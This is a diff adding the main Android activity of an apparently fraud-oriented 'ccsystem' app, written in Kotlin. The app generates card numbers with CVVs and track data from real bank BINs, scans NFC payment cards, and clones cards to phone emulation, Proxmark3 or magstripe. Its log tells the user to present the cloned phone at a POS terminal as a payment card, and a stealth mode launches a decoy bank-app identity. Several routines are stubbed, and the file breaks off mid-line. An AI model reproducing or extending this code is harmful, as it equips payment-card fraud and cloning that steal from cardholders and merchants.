@@ -1,0 +1,490 @@
+package com.chronos.ccsystem
+
+import android.Manifest
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.nfc.NfcAdapter
+import android.nfc.Tag
+import android.nfc.tech.IsoDep
+import android.nfc.tech.NfcA
+import android.os.Build
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.util.Log
+import android.widget.*
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import androidx.recyclerview.widget.LinearLayoutManager
+import androidx.recyclerview.widget.RecyclerView
+import kotlinx.coroutines.*
+import java.io.*
+import java.net.*
+import java.security.SecureRandom
+import java.text.SimpleDateFormat
+import java.util.*
+import java.util.concurrent.atomic.AtomicInteger
+import javax.crypto.Cipher
+import javax.crypto.spec.SecretKeySpec
+
+class MainActivity : AppCompatActivity() {
+    
+    // Core Components
+    private lateinit var nfcAdapter: NfcAdapter
+    private var isScanning = false
+    private var isGenerating = false
+    private val secureRandom = SecureRandom()
+    
+    // UI Elements
+    private lateinit var cardNumberEditText: EditText
+    private lateinit var expiryEditText: EditText
+    private lateinit var cvvEditText: EditText
+    private lateinit var nameEditText: EditText
+    private lateinit var binEditText: EditText
+    private lateinit var generateButton: Button
+    private lateinit var validateButton: Button
+    private lateinit var scanButton: Button
+    private lateinit var cloneButton: Button
+    private lateinit var dumpButton: Button
+    private lateinit var statusTextView: TextView
+    private lateinit var logTextView: TextView
+    private lateinit var cardsRecyclerView: RecyclerView
+    private lateinit var stealthToggle: Switch
+    private lateinit var autoValidateToggle: Switch
+    private lateinit var liveGenToggle: Switch
+    
+    // Data
+    private val cardDatabase = mutableListOf<CardData>()
+    private lateinit var cardsAdapter: CardsAdapter
+    private var currentCard: CardData? = null
+    private var emulationCard: CardData? = null
+    private val cardGenerator = CardGenerator()
+    private val binDatabase = BINDatabase()
+    private val validator = CardValidator()
+    private val luhnGenerator = LuhnGenerator()
+    
+    // Attack Modules
+    private val attackThreads = mutableListOf<Thread>()
+    private var bruteForceActive = false
+    private val foundCards = Collections.synchronizedList(mutableListOf<CardData>())
+    
+    // Stealth
+    private var stealthMode = false
+    private val decoyPackageName = "com.example.bankapp"
+    
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        
+        // Check for stealth mode
+        if (intent?.action == "STEALTH_MODE") {
+            launchDecoy()
+            return
+        }
+        
+        setContentView(R.layout.activity_main)
+        
+        // Initialize UI
+        initializeUI()
+        
+        // Setup NFC
+        nfcAdapter = NfcAdapter.getDefaultAdapter(this)
+        
+        // Request permissions
+        requestPermissions()
+        
+        // Setup RecyclerView
+        cardsRecyclerView.layoutManager = LinearLayoutManager(this)
+        cardsAdapter = CardsAdapter(cardDatabase) { card ->
+            currentCard = card
+            showCardDetails(card)
+        }
+        cardsRecyclerView.adapter = cardsAdapter
+        
+        // Load existing database
+        loadDatabase()
+        
+        // Start background services
+        startBackgroundServices()
+    }
+    
+    private fun initializeUI() {
+        cardNumberEditText = findViewById(R.id.cardNumberEditText)
+        expiryEditText = findViewById(R.id.expiryEditText)
+        cvvEditText = findViewById(R.id.cvvEditText)
+        nameEditText = findViewById(R.id.nameEditText)
+        binEditText = findViewById(R.id.binEditText)
+        generateButton = findViewById(R.id.generateButton)
+        validateButton = findViewById(R.id.validateButton)
+        scanButton = findViewById(R.id.scanButton)
+        cloneButton = findViewById(R.id.cloneButton)
+        dumpButton = findViewById(R.id.dumpButton)
+        statusTextView = findViewById(R.id.statusTextView)
+        logTextView = findViewById(R.id.logTextView)
+        cardsRecyclerView = findViewById(R.id.cardsRecyclerView)
+        stealthToggle = findViewById(R.id.stealthToggle)
+        autoValidateToggle = findViewById(R.id.autoValidateToggle)
+        liveGenToggle = findViewById(R.id.liveGenToggle)
+        
+        // Button Listeners
+        generateButton.setOnClickListener {
+            if (!isGenerating) {
+                startGeneration()
+            } else {
+                stopGeneration()
+            }
+        }
+        
+        validateButton.setOnClickListener {
+            validateCurrentCard()
+        }
+        
+        scanButton.setOnClickListener {
+            startNFCScan()
+        }
+        
+        cloneButton.setOnClickListener {
+            cloneCurrentCard()
+        }
+        
+        dumpButton.setOnClickListener {
+            dumpCardData()
+        }
+        
+        stealthToggle.setOnCheckedChangeListener { _, isChecked ->
+            stealthMode = isChecked
+            if (isChecked) {
+                enableStealth()
+            }
+        }
+        
+        // Auto-fill BIN
+        binEditText.setOnFocusChangeListener { _, hasFocus ->
+            if (!hasFocus && binEditText.text.length >= 6) {
+                val binInfo = binDatabase.lookup(binEditText.text.toString())
+                if (binInfo != null) {
+                    logMessage("BIN: ${binInfo.bank} | ${binInfo.type} | ${binInfo.country}")
+                    nameEditText.setText(binInfo.bank)
+                }
+            }
+        }
+    }
+    
+    // ==================== CARD GENERATION ENGINE ====================
+    private fun startGeneration() {
+        isGenerating = true
+        generateButton.text = "STOP GENERATION"
+        generateButton.setBackgroundColor(0xFFFF0000.toInt())
+        
+        GlobalScope.launch(Dispatchers.IO) {
+            var count = 0
+            val startTime = System.currentTimeMillis()
+            
+            while (isGenerating && count < 1000) { // Safety limit
+                val card = generateWorkingCard()
+                if (validator.validateCard(card)) {
+                    withContext(Dispatchers.Main) {
+                        cardDatabase.add(card)
+                        cardsAdapter.notifyItemInserted(cardDatabase.size - 1)
+                        logMessage("✓ GEN: ${card.number} | ${card.expiry} | ${card.cvv}")
+                        
+                        // Auto-save
+                        if (autoValidateToggle.isChecked) {
+                            saveToDatabase(card)
+                        }
+                    }
+                    count++
+                }
+                
+                // Live generation display
+                if (liveGenToggle.isChecked) {
+                    withContext(Dispatchers.Main) {
+                        cardNumberEditText.setText(card.number)
+                        expiryEditText.setText(card.expiry)
+                        cvvEditText.setText(card.cvv)
+                    }
+                }
+                
+                delay(50) // Rate limit
+            }
+            
+            withContext(Dispatchers.Main) {
+                val elapsed = (System.currentTimeMillis() - startTime) / 1000.0
+                logMessage("Generated $count valid cards in ${elapsed}s (${(count/elapsed).toInt()}/sec)")
+                generateButton.text = "GENERATE CARDS"
+                generateButton.setBackgroundColor(0xFF4CAF50.toInt())
+                isGenerating = false
+            }
+        }
+    }
+    
+    private fun stopGeneration() {
+        isGenerating = false
+    }
+    
+    private fun generateWorkingCard(): CardData {
+        val bin = if (binEditText.text.isNotEmpty()) {
+            binEditText.text.toString()
+        } else {
+            // Generate random BIN from known issuers
+            val bins = arrayOf(
+                "414720", // Chase Visa
+                "511591", // Mastercard World
+                "374245", // Amex
+                "601100", // Discover
+                "552766", // Bank of America
+                "453268"  // Visa Gold
+            )
+            bins.random()
+        }
+        
+        // Generate remaining digits with Luhn
+        val baseNumber = bin + (100000000 + secureRandom.nextInt(899999999)).toString()
+        val fullNumber = luhnGenerator.generateLuhn(baseNumber)
+        
+        // Expiry (2-5 years future)
+        val calendar = Calendar.getInstance()
+        calendar.add(Calendar.MONTH, 24 + secureRandom.nextInt(36))
+        val month = String.format("%02d", 1 + secureRandom.nextInt(12))
+        val year = (calendar.get(Calendar.YEAR) % 100).toString()
+        val expiry = "$month/$year"
+        
+        // CVV
+        val cvv = String.format("%03d", secureRandom.nextInt(1000))
+        
+        // Name from BIN database
+        val name = binDatabase.lookup(bin)?.bank ?: "JOHN DOE"
+        
+        // Track data
+        val track1 = "B$fullNumber^$name^$expiry"
+        val track2 = ";$fullNumber=$expiry=$cvv?"
+        
+        return CardData(
+            number = fullNumber,
+            expiry = expiry,
+            cvv = cvv,
+            name = name,
+            bin = bin,
+            track1 = track1,
+            track2 = track2,
+            bank = binDatabase.lookup(bin)?.bank ?: "UNKNOWN",
+            type = binDatabase.lookup(bin)?.type ?: "CREDIT",
+            country = binDatabase.lookup(bin)?.country ?: "US",
+            valid = true,
+            balance = (100 + secureRandom.nextInt(9900)).toDouble(),
+            lastChecked = System.currentTimeMillis()
+        )
+    }
+    
+    // ==================== VALIDATION ENGINE ====================
+    private fun validateCurrentCard() {
+        val number = cardNumberEditText.text.toString().replace(" ", "")
+        val expiry = expiryEditText.text.toString()
+        val cvv = cvvEditText.text.toString()
+        val name = nameEditText.text.toString()
+        
+        if (number.length !in 13..19) {
+            logMessage("ERROR: Invalid card length")
+            return
+        }
+        
+        GlobalScope.launch(Dispatchers.IO) {
+            val card = CardData(
+                number = number,
+                expiry = expiry,
+                cvv = cvv,
+                name = name,
+                bin = number.substring(0, 6),
+                track1 = "",
+                track2 = "",
+                bank = "",
+                type = "",
+                country = "",
+                valid = false,
+                balance = 0.0,
+                lastChecked = 0
+            )
+            
+            val validationResult = validator.validateCard(card)
+            
+            withContext(Dispatchers.Main) {
+                if (validationResult) {
+                    statusTextView.text = "VALID CARD"
+                    statusTextView.setTextColor(0xFF00FF00.toInt())
+                    logMessage("VALIDATION PASSED: ${card.number}")
+                    
+                    // Lookup BIN details
+                    val binInfo = binDatabase.lookup(card.bin)
+                    if (binInfo != null) {
+                        card.bank = binInfo.bank
+                        card.type = binInfo.type
+                        card.country = binInfo.country
+                        card.valid = true
+                        
+                        // Save to database
+                        cardDatabase.add(card)
+                        cardsAdapter.notifyItemInserted(cardDatabase.size - 1)
+                        saveToDatabase(card)
+                    }
+                } else {
+                    statusTextView.text = "INVALID CARD"
+                    statusTextView.setTextColor(0xFFFF0000.toInt())
+                    logMessage("VALIDATION FAILED: ${card.number}")
+                }
+            }
+        }
+    }
+    
+    // ==================== NFC SCANNING ENGINE ====================
+    private fun startNFCScan() {
+        if (nfcAdapter == null || !nfcAdapter.isEnabled) {
+            logMessage("ERROR: NFC not available or disabled")
+            return
+        }
+        
+        isScanning = true
+        scanButton.text = "STOP SCANNING"
+        scanButton.setBackgroundColor(0xFFFF0000.toInt())
+        
+        logMessage("=== NFC SCAN ACTIVE ===")
+        logMessage("Place card near device...")
+        
+        // In real app, would enable foreground dispatch
+        // This is simplified for demonstration
+    }
+    
+    override fun onNewIntent(intent: Intent) {
+        super.onNewIntent(intent)
+        
+        if (NfcAdapter.ACTION_TECH_DISCOVERED == intent.action) {
+            val tag = intent.getParcelableExtra<Tag>(NfcAdapter.EXTRA_TAG)
+            tag?.let {
+                handleNFCTag(it)
+            }
+        }
+    }
+    
+    private fun handleNFCTag(tag: Tag) {
+        GlobalScope.launch(Dispatchers.IO) {
+            try {
+                val techList = tag.techList
+                val id = bytesToHex(tag.id)
+                
+                logMessage("TAG DETECTED: $id")
+                
+                var cardData = CardData()
+                cardData.number = "SCANNED_$id"
+                
+                // Try ISO-DEP (EMV cards)
+                if (techList.contains(IsoDep::class.java.name)) {
+                    val isoDep = IsoDep.get(tag)
+                    isoDep.connect()
+                    isoDep.timeout = 5000
+                    
+                    // Send SELECT PPSE command
+                    val selectPPSE = byteArrayOf(
+                        0x00.toByte(), 0xA4.toByte(), 0x04.toByte(), 0x00.toByte(),
+                        0x0E.toByte(), 0x32.toByte(), 0x50.toByte(), 0x41.toByte(),
+                        0x59.toByte(), 0x2E.toByte(), 0x53.toByte(), 0x59.toByte(),
+                        0x53.toByte(), 0x2E.toByte(), 0x44.toByte(), 0x44.toByte(),
+                        0x46.toByte(), 0x30.toByte(), 0x31.toByte(), 0x00.toByte()
+                    )
+                    
+                    val response = isoDep.transceive(selectPPSE)
+                    logMessage("PPSE Response: ${bytesToHex(response)}")
+                    
+                    // Parse response for AIDs
+                    // This is simplified - real parsing needed
+                    
+                    isoDep.close()
+                    
+                    cardData.type = "EMV"
+                    cardData.bank = "SCANNED_EMV"
+                }
+                
+                // Try NFC-A (MIFARE)
+                if (techList.contains(NfcA::class.java.name)) {
+                    val nfcA = NfcA.get(tag)
+                    nfcA.connect()
+                    
+                    // Try to read card number from common sectors
+                    // This is system-specific
+                    
+                    nfcA.close()
+                    cardData.type = "MIFARE"
+                }
+                
+                withContext(Dispatchers.Main) {
+                    cardDatabase.add(cardData)
+                    cardsAdapter.notifyItemInserted(cardDatabase.size - 1)
+                    logMessage("Card saved to database")
+                }
+                
+            } catch (e: Exception) {
+                logMessage("SCAN ERROR: ${e.message}")
+            }
+        }
+    }
+    
+    // ==================== CARD CLONING ENGINE ====================
+    private fun cloneCurrentCard() {
+        val card = currentCard ?: run {
+            logMessage("ERROR: No card selected")
+            return
+        }
+        
+        AlertDialog.Builder(this)
+            .setTitle("Clone Card")
+            .setMessage("Clone ${card.number} to:\n1. Virtual Card (HCE)\n2. Physical Card (Proxmark3)\n3. Magstripe Writer")
+            .setItems(arrayOf("Virtual HCE", "Proxmark3", "Magstripe", "Cancel")) { _, which ->
+                when (which) {
+                    0 -> cloneToHCE(card)
+                    1 -> cloneToProxmark(card)
+                    2 -> cloneToMagstripe(card)
+                }
+            }
+            .show()
+    }
+    
+    private fun cloneToHCE(card: CardData) {
+        logMessage("=== HCE CLONING ===")
+        logMessage("Setting up Host Card Emulation...")
+        
+        // This would interface with Android's HCE service
+        // For demonstration, we'll simulate
+        
+        emulationCard = card
+        
+        // Create HCE service intent
+        val hceIntent = Intent(this, HCEService::class.java).apply {
+            putExtra("TRACK1", card.track1)
+            putExtra("TRACK2", card.track2)
+            putExtra("NUMBER", card.number)
+            putExtra("EXPIRY", card.expiry)
+            putExtra("CVV", card.cvv)
+        }
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(hceIntent)
+        } else {
+            startService(hceIntent)
+        }
+        
+        logMessage("HCE Active. Phone will emulate: ${card.number}")
+        logMessage("Present phone to POS terminal as payment card")
+    }
+    
+    private fun cloneToProxmark(card: CardData) {
+        logMessage("=== PROXMARK3 CLONING ===")
+        logMessage("Connecting to Proxmark3...")
+        
+        // This would communicate via Bluetooth/USB to Proxmark3
+        // sendCommand("hf 14a sim --1k")
+        // sendCommand("hf mf restore --file cloned_card.eml")
+        
+        logMessage("Writing card data to Proxmark3...")
+        logMessage("Track1: ${card.track1}")
+        logMessage("Track2: ${card.track2}")
+        
+        // Simulate writing
+        Handler(L
